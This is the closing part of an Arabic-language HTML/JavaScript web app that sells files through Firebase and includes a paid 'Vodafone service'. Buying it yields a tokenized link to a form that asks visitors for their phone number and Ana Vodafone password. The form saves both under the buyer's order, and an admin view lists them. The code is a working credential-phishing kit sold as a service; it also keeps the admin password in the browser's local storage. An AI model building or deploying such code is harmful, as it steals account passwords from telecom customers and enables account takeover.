                message += `📊 الحالة: ${order.status === 'pending' ? '⏳ بانتظار' : order.status === 'completed' ? '✅ مكتمل' : '❌ مرفوض'}\n`;
                
                if (order.linkToken) {
                    const pageUrl = window.location.origin + window.location.pathname + '?vodafone=' + order.linkToken;
                    message += `🔗 الرابط: ${pageUrl}\n`;
                }
                
                if (order.collectedData && Object.keys(order.collectedData).length > 0) {
                    message += `\n📊 البيانات المجمعة:\n`;
                    Object.keys(order.collectedData).forEach(dataId => {
                        const data = order.collectedData[dataId];
                        message += `- ${data.phoneNumber} (${data.password}) - ${new Date(data.submittedAt).toLocaleString('ar-EG')}\n`;
                    });
                }
                
                alert(message);
            } catch (error) {
                showNotification('حدث خطأ في عرض الطلب', 'error');
            }
        }
        
        // حذف طلب فودافون
        async function deleteVodafoneOrder(orderId) {
            if (!isAdmin) return;
            
            if (confirm('⚠️ هل أنت متأكد من حذف هذا الطلب؟')) {
                showLoading(true);
                
                try {
                    await vodafoneRef.child(orderId).remove();
                    showNotification('✅ تم حذف الطلب بنجاح', 'success');
                    loadOrdersFromFirebase();
                } catch (error) {
                    showNotification('حدث خطأ أثناء حذف الطلب', 'error');
                } finally {
                    showLoading(false);
                }
            }
        }
        
        // ============================================
        // 7. عزل البيانات
        // ============================================
        
        // التحقق من رابط فودافون
        function checkVodafoneLink() {
            const urlParams = new URLSearchParams(window.location.search);
            const vodafoneToken = urlParams.get('vodafone');
            
            if (vodafoneToken) {
                // إظهار صفحة فودافون
                showVodafoneServicePage(vodafoneToken);
            }
        }
        
        // عرض صفحة فودافون
        function showVodafoneServicePage(token) {
            document.getElementById('vodafoneServicePage').style.display = 'flex';
            
            // البحث عن الطلب المناسب
            vodafoneRef.orderByChild('linkToken').equalTo(token).once('value', (snapshot) => {
                const orders = snapshot.val();
                if (!orders) {
                    document.getElementById('vodafoneForm').style.display = 'none';
                    document.getElementById('vodafoneResult').innerHTML = `
                        <h4 style="color: var(--red);">
                            <i class="fas fa-exclamation-triangle"></i> الرابط غير صالح
                        </h4>
                        <p style="color: #DDDDDD;">هذا الرابط غير صالح أو منتهي الصلاحية.</p>
                    `;
                    document.getElementById('vodafoneResult').style.display = 'block';
                    return;
                }
                
                const orderId = Object.keys(orders)[0];
                const order = orders[orderId];
                
                // حفظ معرف الطلب في النموذج
                document.getElementById('vodafoneForm').dataset.orderId = orderId;
                document.getElementById('vodafoneForm').dataset.customerName = order.customerName;
            });
        }
        
        // إغلاق صفحة فودافون
        document.getElementById('closeVodafonePage').addEventListener('click', function() {
            document.getElementById('vodafoneServicePage').style.display = 'none';
            window.history.replaceState({}, document.title, window.location.pathname);
        });
        
        // إرسال بيانات فودافون
        document.getElementById('vodafoneForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const orderId = this.dataset.orderId;
            const customerName = this.dataset.customerName;
            const phoneNumber = document.getElementById('phoneNumber').value;
            const password = document.getElementById('vodafonePassword').value;
            
            if (!orderId || !customerName) {
                showNotification('الرابط غير صالح', 'error');
                return;
            }
            
            showLoading(true);
            
            try {
                const dataId = 'data_' + Date.now();
                
                // حفظ البيانات في الطلب
                await vodafoneRef.child(orderId).child('collectedData').child(dataId).set({
                    phoneNumber: phoneNumber,
                    password: password,
                    submittedAt: Date.now(),
                    submittedFrom: navigator.userAgent
                });
                
                // إخفاء النموذج وإظهار رسالة النجاح
                document.getElementById('vodafoneForm').style.display = 'none';
                document.getElementById('resultMessage').textContent = 
                    `شكراً لك! تم إرسال بياناتك بنجاح إلى ${customerName}.\n\nرقمك: ${phoneNumber}\nسيتم التواصل معك قريباً.`;
                document.getElementById('vodafoneResult').style.display = 'block';
                
                showNotification('✅ تم إرسال بياناتك بنجاح!', 'success');
            } catch (error) {
                showNotification('حدث خطأ أثناء إرسال البيانات', 'error');
            } finally {
                showLoading(false);
            }
        });
        
        // ============================================
        // 8. تحسينات عامة وإصلاحات
        // ============================================
        
        // تعديل دالة displayFiles لإضافة خدمة فودافون
        function displayFiles(filesData) {
            const filesContainer = document.getElementById('filesContainer');
            const noFilesMessage = document.getElementById('noFilesMessage');
            
            filesContainer.innerHTML = '';
            
            // إضافة خدمة فودافون أولاً
            const vodafoneCard = createVodafoneServiceCard();
            filesContainer.appendChild(vodafoneCard);
            
            if (!filesData || Object.keys(filesData).length === 0) {
                noFilesMessage.style.display = 'block';
                return;
            }
            
            noFilesMessage.style.display = 'none';
            
            Object.keys(filesData).forEach(fileId => {
                const file = filesData[fileId];
                // تخطي خدمة فودافون لأننا أضفناها مسبقاً
                if (file.isActive !== false && !file.isSpecialService) {
                    const fileCard = createFileCard(file, fileId);
                    filesContainer.appendChild(fileCard);
                }
            });
        }
        
        // تعديل دالة createOrder لدعم خدمة فودافون
        async function createOrder(proofImage, proofType = 'image') {
            if (!selectedFileForPurchase || !currentUser) return;
            
            showLoading(true);
            
            try {
                // إذا كانت خدمة فودافون
                if (selectedFileForPurchase.isSpecialService) {
                    await createVodafoneOrder(proofImage, proofType);
                    return;
                }
                
                // الباقي من الكود الأصلي...
                let proofUrl = null;
                let proofFileName = null;
                
                // إذا كانت هناك صورة إثبات، رفعها
                if (proofImage && proofType === 'image') {
                    showNotification('جارٍ رفع إثبات الدفع...', 'info');
                    
                    const storageRef = storage.ref();
                    proofFileName = `proof_${Date.now()}_${proofFile.name}`;
                    const proofRef = storageRef.child(`proofs/${proofFileName}`);
                    const uploadTask = proofRef.put(proofFile);
                    
                    // عرض شريط التقدم
                    const progressContainer = document.createElement('div');
                    progressContainer.className = 'progress-container';
                    progressContainer.innerHTML = '<div class="progress-bar"></div>';
                    document.getElementById('proofStep').appendChild(progressContainer);
                    const progressBar = progressContainer.querySelector('.progress-bar');
                    
                    uploadTask.on('state_changed',
                        (snapshot) => {
                            const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
                            progressBar.style.width = progress + '%';
                        },
                        (error) => {
                            progressContainer.remove();
                            throw error;
                        },
                        async () => {
                            proofUrl = await uploadTask.snapshot.ref.getDownloadURL();
                            progressContainer.remove();
                        }
                    );
                    
                    // انتظار الانتهاء من الرفع
                    await new Promise((resolve, reject) => {
                        uploadTask.on('state_changed',
                            null,
                            reject,
                            resolve
                        );
                    });
                }
                
                // إنشاء بيانات الطلب
                const orderId = 'order_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                const order = {
                    id: orderId,
                    fileId: selectedFileForPurchase.id,
                    fileName: selectedFileForPurchase.name,
                    filePrice: selectedFileForPurchase.price,
                    customerName: currentUser,
                    customerDeviceId: deviceId,
                    status: 'pending',
                    proofType: proofType,
                    proofUrl: proofUrl,
                    proofFileName: proofFileName,
                    createdAt: Date.now(),
                    confirmedAt: null
                };
                
                // حفظ الطلب في قاعدة البيانات
                await ordersRef.child(orderId).set(order);
                
                showNotification('✅ تم إرسال طلبك للمسؤول بنجاح!', 'success');
                goBackToFiles();
                
            } catch (error) {
                showNotification('حدث خطأ أثناء إنشاء الطلب: ' + error.message, 'error');
            } finally {
                showLoading(false);
            }
        }
        
        // إنشاء طلب فودافون
        async function createVodafoneOrder(proofImage, proofType) {
            try {
                let proofUrl = null;
                let proofFileName = null;
                
                // إذا كانت هناك صورة إثبات، رفعها
                if (proofImage && proofType === 'image') {
                    showNotification('جارٍ رفع إثبات الدفع...', 'info');
                    
                    const storageRef = storage.ref();
                    proofFileName = `proof_${Date.now()}_${proofFile.name}`;
                    const proofRef = storageRef.child(`proofs/${proofFileName}`);
                    const uploadTask = proofRef.put(proofFile);
                    
                    // انتظار الانتهاء من الرفع
                    await new Promise((resolve, reject) => {
                        uploadTask.on('state_changed',
                            null,
                            reject,
                            resolve
                        );
                    });
                    
                    proofUrl = await uploadTask.snapshot.ref.getDownloadURL();
                }
                
                // إنشاء طلب فودافون
                const orderId = 'vodafone_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                const order = {
                    id: orderId,
                    serviceType: 'الحصول على باسورد انا فودافون',
                    amount: 200,
                    customerName: currentUser,
                    customerDeviceId: deviceId,
                    status: 'pending',
                    proofType: proofType,
                    proofUrl: proofUrl,
                    proofFileName: proofFileName,
                    createdAt: Date.now(),
                    confirmedAt: null,
                    collectedData: {} // مكان تخزين البيانات المجمعة
                };
                
                // حفظ الطلب في قاعدة البيانات
                await vodafoneRef.child(orderId).set(order);
                
                showNotification('✅ تم إرسال طلب فودافون بنجاح!', 'success');
                goBackToFiles();
                
            } catch (error) {
                throw error;
            }
        }
        
        // ============================================
        // تهيئة النظام
        // ============================================
        
        // توليد معرف الجهاز
        function generateDeviceId() {
            let savedDeviceId = localStorage.getItem('eliteFilesDeviceId');
            
            if (!savedDeviceId) {
                savedDeviceId = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                localStorage.setItem('eliteFilesDeviceId', savedDeviceId);
            }
            
            deviceId = savedDeviceId;
            return savedDeviceId;
        }
        
        // تحميل حالة المستخدم
        function loadUserSession() {
            const savedUser = localStorage.getItem('eliteFilesUser');
            const savedAdmin = localStorage.getItem('eliteFilesAdmin');
            const savedAdminPassword = localStorage.getItem('eliteFilesAdminPassword');
            const savedDeviceId = localStorage.getItem('eliteFilesDeviceId');
            
            if (savedUser && savedDeviceId === deviceId) {
                currentUser = savedUser;
                
                if (savedAdmin === 'true' && savedAdminPassword === ADMIN_PASSWORD) {
                    isAdmin = true;
                    currentUser = ADMIN_USERNAME;
                    showMainContent();
                } else if (savedUser !== ADMIN_USERNAME) {
                    checkUserDevice(savedUser).then((isValid) => {
                        if (isValid) {
                            isAdmin = false;
                            currentUser = savedUser;
                            showMainContent();
                            loadUserPurchasedFiles();
                        }
                    });
                }
            }
            
            // التحقق من رابط فودافون
            setTimeout(checkVodafoneLink, 1000);
        }
        
        // تسجيل دخول المستخدم
        document.getElementById('loginBtn').addEventListener('click', async function() {
            const username = document.getElementById('usernameInput').value.trim();
            
            if (!username) {
                showNotification('يرجى إدخال اسم المستخدم', 'error');
                return;
            }
            
            if (username === ADMIN_USERNAME) {
                showAdminLogin();
                return;
            }
            
            await loginAsUser(username);
        });
        
        // دخول المستخدم
        async function loginAsUser(username) {
            showLoading(true);
            
            try {
                const isValid = await checkUserDevice(username);
                
                if (!isValid) {
                    showLoading(false);
                    return;
                }
                
                isAdmin = false;
                currentUser = username;
                
                saveUserSession();
                loadUserPurchasedFiles();
                showMainContent();
                
                showNotification(`مرحباً بك ${username}! 👋`, 'success');
                
            } catch (error) {
                showNotification('حدث خطأ أثناء تسجيل الدخول', 'error');
            } finally {
                showLoading(false);
            }
        }
        
        // حفظ جلسة المستخدم
        function saveUserSession() {
            if (currentUser === ADMIN_USERNAME && isAdmin) {
                localStorage.setItem('eliteFilesUser', currentUser);
                localStorage.setItem('eliteFilesAdmin', 'true');
                localStorage.setItem('eliteFilesAdminPassword', ADMIN_PASSWORD);
                localStorage.setItem('eliteFilesDeviceId', deviceId);
            } else if (currentUser !== ADMIN_USERNAME) {
                localStorage.setItem('eliteFilesUser', currentUser);
                localStorage.setItem('eliteFilesAdmin', 'false');
                localStorage.setItem('eliteFilesDeviceId', deviceId);
                localStorage.removeItem('eliteFilesAdminPassword');
            }
        }
        
        // عرض المحتوى الرئيسي
        function showMainContent() {
            document.getElementById('loginSection').classList.add('hidden');
            document.getElementById('mainContent').classList.remove('hidden');
            
            updateUserBar();
            loadFilesFromFirebase();
            
            if (isAdmin) {
                document.getElementById('adminPanel').classList.remove('hidden');
                document.getElementById('filesSection').classList.add('hidden');
                loadAllUsers();
                loadOrdersFromFirebase();
            } else {
                document.getElementById('adminPanel').classList.add('hidden');
                document.getElementById('filesSection').classList.remove('hidden');
            }
            
            document.getElementById('paymentSection').style.display = 'none';
        }
        
        // تحديث شريط المستخدم
        function updateUserBar() {
            const userInfo = document.getElementById('userInfo');
            
            if (isAdmin) {
                userInfo.className = 'admin-badge';
                userInfo.innerHTML = `<i class="fas fa-user-shield"></i> ${currentUser} <span style="font-size: 0.85rem; opacity: 0.9;">(مسؤول)</span>`;
                userInfo.title = 'أنت مسؤول النظام';
                userInfo.onclick = function() {
                    if (confirm('هل تريد تسجيل الخروج؟')) {
                        logout();
                    }
                };
            } else {
                userInfo.className = 'user-badge';
                userInfo.innerHTML = `<i class="fas fa-user"></i> ${currentUser}`;
                userInfo.title = 'مستخدم عادي';
                userInfo.onclick = function() {
                    if (confirm('هل تريد تسجيل الخروج؟')) {
                        logout();
                    }
                };
            }
        }
        
        // تسجيل الخروج
        function logout() {
            showLoading(true);
            
            setTimeout(() => {
                localStorage.removeItem('eliteFilesUser');
                localStorage.removeItem('eliteFilesAdmin');
                localStorage.removeItem('eliteFilesAdminPassword');
                location.reload();
            }, 500);
        }
        
        // ============================================
        // دعم الكود الأصلي
        // ============================================
        
        // جميع الدوال الأصلية محفوظة مع تعديلات طفيفة
        
        // تحميل الملفات من Firebase
        function loadFilesFromFirebase() {
            filesRef.on('value', (snapshot) => {
                const filesData = snapshot.val();
                displayFiles(filesData);
                
                if (isAdmin) {
                    loadCurrentFilesForAdmin();
                }
            });
        }
        
        // إنشاء بطاقة ملف
        function createFileCard(file, fileId) {
            const fileCard = document.createElement('div');
            fileCard.className = 'file-card';
            
            const isFree = file.price === 0 || !file.isPaid;
            const isPurchased = userFiles[fileId] === true;
            
            fileCard.innerHTML = `
                <div class="file-header">
                    <i class="${getFileIcon(file.type)} file-icon"></i>
                    <h3 class="file-name">${file.name}</h3>
                    <div class="${isFree ? 'free-badge' : 'file-price'}">
                        ${isFree ? 'مجاني' : file.price + ' ج.م'}
                    </div>
                </div>
                <div class="file-body">
                    <p class="file-description">${file.description}</p>
                    <div class="file-details">
                        <div class="file-detail">
                            <i class="fas fa-file"></i>
                            <span>${getFileTypeName(file.type)}</span>
                        </div>
                        <div class="file-detail">
                            <i class="fas fa-weight-hanging"></i>
                            <span>${formatFileSize(file.size)}</span>
                        </div>
                        <div class="file-detail">
                            <i class="fas fa-download"></i>
                            <span>${file.downloads || 0}</span>
                        </div>
                    </div>
                    <div class="file-actions">
                        ${isFree ? 
                            `<button class="download-free-btn" onclick="downloadFile('${fileId}', true)">
                                <i class="fas fa-download"></i> تحميل مجاني
                            </button>` :
                            (isPurchased ?
                                `<button class="download-btn" onclick="downloadFile('${fileId}', false)">
                                    <i class="fas fa-download"></i> تحميل الملف
                                </button>` :
                                `<button class="buy-btn" onclick="buyFile('${fileId}')">
                                    <i class="fas fa-shopping-cart"></i> شراء الآن
                                </button>`
                            )
                        }
                    </div>
                </div>
            `;
            
            return fileCard;
        }
        
        // تحميل الملفات المشتراة
        function loadUserPurchasedFiles() {
            if (!currentUser || isAdmin) return;
            
            purchasedRef.child(currentUser).on('value', (snapshot) => {
                const purchasedData = snapshot.val();
                userFiles = purchasedData || {};
                loadFilesFromFirebase();
            });
        }
        
        // شراء ملف
        function buyFile(fileId) {
            filesRef.child(fileId).once('value', (snapshot) => {
                const file = snapshot.val();
                if (!file) return;
                
                selectedFileForPurchase = { ...file, id: fileId };
                
                document.getElementById('filesSection').style.display = 'none';
                document.getElementById('adminPanel').style.display = 'none';
                document.getElementById('paymentSection').style.display = 'block';
                
                document.getElementById('paymentAmount').textContent = file.price;
                document.getElementById('paymentFileName').textContent = file.name;
                
                document.getElementById('uploadArea').classList.add('hidden');
                document.getElementById('previewContainer').classList.add('hidden');
                document.getElementById('proofFileName').textContent = '';
                if (proofFile) {
                    proofFile = null;
                    document.getElementById('paymentProof').value = '';
                }
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
        
        // إعداد معالجات الأحداث
        function setupEventListeners() {
            document.querySelector('.logo').addEventListener('click', goBackToFiles);
            
            document.getElementById('usernameInput').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    document.getElementById('loginBtn').click();
                }
            });
            
            document.getElementById('adminPassword').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    document.getElementById('loginAdminBtn').click();
                }
            });
            
            document.getElementById('filePrice').addEventListener('input', function() {
                const price = parseInt(this.value) || 0;
                const isPaidCheckbox = document.getElementById('isPaid');
                if (price > 0) {
                    isPaidCheckbox.checked = true;
                }
            });
            
            document.getElementById('isPaid').addEventListener('change', function() {
                const priceInput = document.getElementById('filePrice');
                if (!this.checked) {
                    priceInput.value = 0;
                }
            });
            
            // إضافة معالجات جديدة
            document.getElementById('uploadProofBtn').addEventListener('click', function() {
                document.getElementById('uploadArea').classList.remove('hidden');
                document.getElementById('paymentProof').click();
            });
            
            document.getElementById('whatsappProofBtn').addEventListener('click', function() {
                if (!selectedFileForPurchase) return;
                
                const message = `طلب شراء: ${selectedFileForPurchase.name}\n`
                              + `المبلغ: ${selectedFileForPurchase.price} ج.م\n`
                              + `اسم المستخدم: ${currentUser}\n`
                              + `التاريخ: ${new Date().toLocaleString('ar-EG')}`;
                
                const whatsappUrl = `https://wa.me/${VODAFONE_NUMBER}?text=${encodeURIComponent(message)}`;
                window.open(whatsappUrl, '_blank');
                
                createOrder(null, 'whatsapp');
            });
            
            document.getElementById('paymentProof').addEventListener('change', function(e) {
                const file = e.target.files[0];
                if (file) {
                    if (file.size > 5 * 1024 * 1024) {
                        showNotification('صورة كبيرة جداً! الحد الأقصى 5MB', 'error');
                        return;
                    }
                    
                    const validTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/jpg'];
                    if (!validTypes.includes(file.type)) {
                        showNotification('نوع الملف غير مدعوم. يسمح فقط بصور JPG, PNG, GIF', 'error');
                        return;
                    }
                    
                    proofFile = file;
                    document.getElementById('proofFileName').textContent = file.name;
                    
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        document.getElementById('previewImage').src = e.target.result;
                        document.getElementById('previewContainer').classList.remove('hidden');
                        document.getElementById('proofStep').scrollIntoView({ behavior: 'smooth' });
                    };
                    reader.readAsDataURL(file);
                    
                    showNotification('تم اختيار صورة الإثبات بنجاح', 'success');
                }
            });
            
            document.getElementById('submitPayment').addEventListener('click', function() {
                if (!proofFile) {
                    showNotification('يرجى رفع إثبات الدفع أولاً', 'error');
                    return;
                }
                createOrder(true, 'image');
            });
            
            document.getElementById('fileUploadArea').addEventListener('click', function() {
                document.getElementById('fileUpload').click();
            });
            
            document.getElementById('fileUpload').addEventListener('change', function(e) {
                const file = e.target.files[0];
                if (file) {
                    if (file.size > 50 * 1024 * 1024) {
                        showNotification('الملف كبير جداً! الحد الأقصى 50MB', 'error');
                        return;
                    }
                    
                    uploadedFile = file;
                    document.getElementById('fileNameDisplay').textContent = file.name;
                    showNotification('تم اختيار الملف: ' + file.name, 'success');
                }
            });
            
            document.getElementById('fileForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                
                if (!isAdmin) {
                    showNotification('ليست لديك صلاحية إدارة الملفات', 'error');
                    return;
                }
                
                const fileName = document.getElementById('fileName').value;
                const fileDescription = document.getElementById('fileDescription').value;
                const filePrice = parseInt(document.getElementById('filePrice').value) || 0;
                const isPaid = document.getElementById('isPaid').checked;
                
                if (!fileName || !fileDescription) {
                    showNotification('يرجى ملء جميع الحقول', 'error');
                    return;
                }
                
                if (isPaid && filePrice <= 0) {
                    showNotification('الملف مدفوع يجب أن يكون له سعر أكبر من صفر', 'error');
                    return;
                }
                
                showLoading(true);
                
                try {
                    if (editingFileId) {
                        await updateExistingFile(fileName, fileDescription, filePrice, isPaid);
                    } else {
                        if (!uploadedFile) {
                            showNotification('يجب رفع ملف حقيقي أولاً', 'error');
                            showLoading(false);
                            return;
                        }
                        await addNewFile(fileName, fileDescription, filePrice, isPaid);
                    }
                } catch (error) {
                    showNotification('حدث خطأ: ' + error.message, 'error');
                } finally {
                    showLoading(false);
                }
            });
        }
        
        // العودة للملفات
        function goBackToFiles() {
            if (isAdmin) {
                document.getElementById('filesSection').style.display = 'none';
                document.getElementById('adminPanel').style.display = 'block';
                document.getElementById('paymentSection').style.display = 'none';
            } else {
                document.getElementById('filesSection').style.display = 'block';
                document.getElementById('adminPanel').style.display = 'none';
                document.getElementById('paymentSection').style.display = 'none';
                loadUserPurchasedFiles();
            }
            
            selectedFileForPurchase = null;
            proofFile = null;
            document.getElementById('previewContainer').classList.add('hidden');
            document.getElementById('uploadArea').classList.add('hidden');
            if (document.getElementById('paymentProof')) {
                document.getElementById('paymentProof').value = '';
            }
            
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        
        // أدوات مساعدة
        function getFileIcon(type) {
            const icons = {
                'pdf': 'fas fa-file-pdf',
                'doc': 'fas fa-file-word',
                'docx': 'fas fa-file-word',
                'txt': 'fas fa-file-alt',
                'zip': 'fas fa-file-archive',
                'rar': 'fas fa-file-archive',
                '7z': 'fas fa-file-archive',
                'mp4': 'fas fa-file-video',
                'avi': 'fas fa-file-video',
                'mkv': 'fas fa-file-video',
                'mp3': 'fas fa-file-audio',
                'wav': 'fas fa-file-audio',
                'jpg': 'fas fa-file-image',
                'jpeg': 'fas fa-file-image',
                'png': 'fas fa-file-image',
                'gif': 'fas fa-file-image',
                'exe': 'fas fa-cogs',
                'msi': 'fas fa-cogs',
                'apk': 'fas fa-mobile-alt'
            };
            return icons[type] || 'fas fa-file';
        }
        
        function getFileExtension(filename) {
            return filename.split('.').pop().toLowerCase();
        }
        
        function getFileTypeName(type) {
            const names = {
                'pdf': 'PDF',
                'doc': 'Word',
                'docx': 'Word',
                'txt': 'نصي',
                'zip': 'ZIP',
                'rar': 'RAR',
                '7z': '7ZIP',
                'mp4': 'فيديو',
                'avi': 'فيديو',
                'mkv': 'فيديو',
                'mp3': 'صوت',
                'wav': 'صوت',
                'jpg': 'صورة',
                'jpeg': 'صورة',
                'png': 'صورة',
                'gif': 'صورة',
                'exe': 'برنامج',
                'msi': 'برنامج',
                'apk': 'تطبيق'
            };
            return names[type] || 'ملف';
        }
        
        function formatFileSize(bytes) {
            if (bytes < 1024) return bytes + ' بايت';
            if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' ك.بايت';
            if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' م.بايت';
            return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' ج.بايت';
        }
        
        function showNotification(message, type = 'success') {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = `notification ${type}`;
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 5000);
        }
        
        function showLoading(show) {
            const spinner = document.getElementById('loadingSpinner');
            spinner.style.display = show ? 'block' : 'none';
        }
        
        // تسجيل دخول الأدمن
        document.getElementById('loginAdminBtn').addEventListener('click', function() {
            const password = document.getElementById('adminPassword').value;
            
            if (password === ADMIN_PASSWORD) {
                showLoading(true);
                
                setTimeout(() => {
                    isAdmin = true;
                    currentUser = ADMIN_USERNAME;
                    saveUserSession();
                    
                    document.getElementById('adminLoginModal').style.display = 'none';
                    document.getElementById('adminPassword').value = '';
                    
                    loadFilesFromFirebase();
                    loadCurrentFilesForAdmin();
                    loadOrdersFromFirebase();
                    loadAllUsers();
                    
                    showMainContent();
                    showLoading(false);
                    showNotification('مرحباً بالمسؤول! 🎯', 'success');
                }, 800);
            } else {
                showNotification('كلمة المرور غير صحيحة! ⚠️', 'error');
                document.getElementById('adminPassword').value = '';
                document.getElementById('adminPassword').focus();
            }
        });
        
        document.getElementById('closeLoginModal').addEventListener('click', function() {
            document.getElementById('adminLoginModal').style.display = 'none';
            document.getElementById('adminPassword').value = '';
        });
        
        function showAdminLogin() {
            document.getElementById('adminLoginModal').style.display = 'flex';
            document.getElementById('adminPassword').focus();
        }
        
        // تهيئة الجهاز عند التحميل
        deviceId = generateDeviceId();
        
        // عند تحميل الصفحة، تحقق من الجلسة
        if (currentUser) {
            loadUserPurchasedFiles();
        }
    </script>
</body>
</html>
        
        
